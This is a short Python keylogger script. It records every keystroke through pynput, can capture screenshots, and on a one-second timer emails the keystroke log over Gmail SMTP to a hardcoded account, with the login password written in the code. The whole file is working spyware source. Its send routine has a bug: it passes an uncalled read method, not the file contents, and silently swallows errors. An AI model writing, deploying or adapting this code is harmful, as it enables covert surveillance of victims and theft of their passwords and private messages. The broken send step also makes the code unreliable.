import time
import os
from threading import Timer, Thread
from mss import mss
from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders

class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def run(self, interval=1):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval is the amount of time in seconds that occurs between screenshots.
        """
        self._build_logs()
        Thread(target=self._keylogger).start()
        #IntervalTimer(interval, self._screenshot).start()
        IntervalTimer(interval, self._Gmail).start()
        

    def _Gmail(self):

        
        
        fromaddr = "hacked.lols123@gmail.com"
        toaddr = "hacked.lols123@gmail.com"

        readd = open('./logs/keylogs/log.txt','r+')
        lines = readd.read
        print(lines)
        
        try:  
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(fromaddr, 'Hacked@123')
            server.sendmail(fromaddr, fromaddr, lines)
            server.quit()
        except:  
            pass
        

def Call():
    mon = Monitor()
    mon.run()
    

#Call()